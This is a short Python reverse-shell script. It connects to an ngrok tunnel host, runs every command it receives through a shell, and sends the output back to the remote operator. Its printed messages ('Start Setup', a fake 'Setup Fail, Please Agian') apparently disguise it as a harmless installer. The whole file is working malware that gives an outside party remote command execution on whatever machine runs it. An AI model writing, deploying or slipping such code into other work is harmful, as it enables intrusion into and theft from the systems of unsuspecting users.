
import socket
import subprocess

host = "0.tcp.ap.ngrok.io"
port = 11121

print('[+] Start Setup')
while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	while True:
		output = s.recv(1024).decode()
		if output == "exit":
			print("[+] Setup Fail, Please Agian")
			s.send(b'exit')
			exit()
		else:
			open = subprocess.Popen(output, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
			data = open.stdout.read() + open.stderr.read()
			s.send(data)	
